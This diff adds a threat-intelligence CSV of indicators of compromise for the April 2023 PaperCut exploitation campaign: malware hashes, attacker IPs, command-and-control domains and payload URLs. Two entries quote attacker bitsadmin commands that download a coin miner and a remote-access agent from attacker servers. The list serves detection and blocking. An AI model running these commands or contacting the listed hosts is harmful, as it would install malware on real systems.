@@ -1,0 +1,42 @@
+﻿Indicator_type,Data,Note
+Description,https://news.sophos.com/en-us/2023/04/27/increased-exploitation-of-papercut-drawing-blood-around-the-internet/,"IoCs for PaperCut attack campaign, April 2023"
+sha256,0ce7c6369c024d497851a482e011ef1528ad270e83995d52213276edbe71403f,Cobalt Strike DLL
+sha256,38d2f150616fa1b2a989a3b97edf07bf13948441f49709f8c2605b0e3d881b44,"Coin miner, TOR communication"
+ip,192.184.35.216,Psychz Networks
+ip,216.122.175.114,Colocation America
+ip,137.184.56.77,Digital Ocean
+ip,45.159.248.244,STARK-INDUSTRIES.SOLUTIONS
+ip,185.254.37.173,Serverion
+ip,185.254.37.236,
+ip,23.184.48.17,  IncogNet LLC
+url,upd488.windowservicecemter.com/download/setup.msi,Atera Agent
+url,study.abroad.ge:443/wp-content/stuff/winlogon.bin,Cobalt Strike C2 connection
+url,upd488.windowservicecemter.com,C2 
+url,upd488.windowservicecemter.com/download/a2.msi,Atera Agent
+url,upd488.windowservicecemter.com/download/a3.msi  ,
+url,upd488.windowservicecemter.com/download/AppPrint.msi,Synchro MSP
+url,tmpfiles.org/dl/1337855/enc.txt,Ransomware Download
+url,50.19.48.59:82/me1.bat,Coin miner script
+url,137.184.56.77:443/for.ps1,
+url,137.184.56.77:443/c.bat,
+url,4.tcp.ngrok.io:14573,Ngrok (Ingress as a service secure app tunnel)
+url,45.159.248.244:8000/wow,Stark Industries
+url,159.65.42.223/r/ppc/02E663CA8C405746/,Digital Ocean
+url,185.254.37.173:443/8a293f2ddb634472a3e8b1ede4e81577.Php?,Serverion
+url,185.254.37.236/ppc,Serverion
+domain,upd343.winserverupdates.com,Cloudflare hosted C2
+domain,ber6vjyb.com,Truebot C2
+url,http://192.184.35.216:443/4591187629.exe,Downloads coin miner (bitsadmin /transfer mydownloadjob /download /priority normal http://192.184.35.216:443/4591187629.exe %WINDIR%setup2.exe)
+url,http://23.184.48.17/bootcamp.zip,DWAgent (bitsadmin /transfer dwa /download /priority FOREGROUND http://23.184.48.17/bootcamp.zip C:\ProgramData\bootcamp.zip)
+domain,cdn-backdl.com,C2 for NetSupport Download
+domain,Jojojovan1.com,NetSupport C2
+domain,Jojojovan2.com,NetSupport C2
+sha256,1097975f1dede47a8ef80bab26c6fed7e3db70f033ad86ec77567351379dadd3,upd488.windowservicecemter.com/download/a2.msi    
+sha256,00ec44df6487faf9949cebee179bafe8377ca4417736766932508f94da0f35fe,upd488.windowservicecemter.com/download/AppPrint.msi
+sha256,d8d49f34f57ce54da60a0d2edf8c7924525b1dd1dcccdead18273a97282ffa94,upd488.windowservicecemter.com/download/a3.msi    
+sha256,f9947c5763542b3119788923977153ff8ca807a2e535e6ab28fc42641983aabb,upd488.windowservicecemter.com/download/setup.msi 
+sha256,0ce7c6369c024d497851a482e011ef1528ad270e83995d52213276edbe71403f,upd488.windowservicecemter.com/download/update.dll
+sha256,582b72bb0f0088aaad17f3aeab98654ede6fed18b5c7f48c1a593e4ec0076a4d ,bootcamp.zip file
+sha256,3b326a3e4f0a03db859feeed7e4e3a832acdaeaf8b2cd69ecc0dce73c1a225c9 ,me1.bat
+sha256,45729491ec4ae2065672e6d93a3aa7533a8058cecb8fcdb79ecd5d10cfa2aeca ,me2.bat
+sha256,487d47985cddf204a94cfd41bd2d89798cdc03c4df8a582ecfe885eeb374a8ae ,winlogon.bat
